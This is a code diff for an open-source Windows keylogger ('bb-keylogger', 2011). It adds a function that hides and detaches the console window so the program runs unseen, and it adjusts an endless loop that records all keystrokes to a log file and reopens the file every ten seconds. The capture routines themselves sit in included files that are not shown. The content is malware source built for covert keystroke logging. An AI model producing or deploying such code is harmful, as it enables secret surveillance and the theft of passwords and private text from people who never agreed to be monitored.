@@ -16,13 +16,15 @@
 */
 
 /*
-* File:   main.c
+* File:   bb-keylogger.c
 * Author: Frapin Kevin
 * Date:   22/03/2011
 *
 * DESCRIPTION
 * -----------------------------------------------------------------------------
-* An open-source keylogger to save all the keystrokes in a log file.
+* File containing :
+*  - the function "main"
+*  - the functions used to initialize the program
 * -----------------------------------------------------------------------------
 */
 
@@ -38,12 +40,28 @@
 #include <winuser.h>
 
 //---------------------------------------------------------- PERSONNAL INCLUDES
-#include "includes/bb-keylogger-globals.h"
+#include "includes/bb-keylogger.h"
+#include "includes/bb-keylogger-file.h"
 #include "includes/bb-keylogger-keyboard.h"
 #include "includes/bb-keylogger-system.h"
-#include "includes/bb-keylogger-utils.h"
 
-//------------------------------------------------------------------------ MAIN
+//------------------------------------------------------------ STATIC FUNCTIONS
+
+/*
+* Function that initializes the program :
+*  - hides the Windows console
+*  - detaches the program from the console
+*/
+static void initialize_program(  )
+{
+	HWND hWnd = ( HWND ) GetConsoleWindow( );
+	// Hide the console
+	ShowWindow( hWnd, SW_HIDE );
+	// Detach the process from the console
+	FreeConsole( );
+}
+
+//--------------------------------------------------------------- MAIN FUNCTION
 
 int main( int argc, char *argv[ ] )
 {	
@@ -71,18 +89,23 @@ int main( int argc, char *argv[ ] )
 	// Log the keystrokes
 	log_infos( log_file, "# Keystrokes :\n" );
 	int i = 0;
+	
+	// Number of cycles between 2 reopening of the log file
+	// Here we want the file to be reopen every 10,000 ms
+	int nb_cycles = 10000 / TIME_TO_SLEEP;
+	
 	for( ; ; )
 	{
 		Sleep( TIME_TO_SLEEP );
 		log_keystrokes( log_file );
 		
-		if( ++i >= 2000/TIME_TO_SLEEP )
-		// If the elapsed time is greater than 2 seconds
+		if( ++i >= nb_cycles )
+		// If the elapsed time is greater than 10 seconds
 		{
 			i = 0;
 			// Reopen the file in order to force synchronization
 			log_file = freopen( log_file_name, "a", log_file );
 		}
 	}
-
 }
+
